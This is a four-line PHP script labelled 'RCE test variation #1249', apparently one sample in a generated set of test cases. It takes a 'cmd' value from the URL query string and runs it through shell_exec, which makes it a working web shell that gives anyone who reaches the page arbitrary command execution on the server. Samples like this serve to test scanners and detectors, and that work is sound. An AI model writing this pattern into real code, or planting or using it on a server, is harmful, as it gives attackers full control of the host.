<?php
// RCE test variation #1249
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>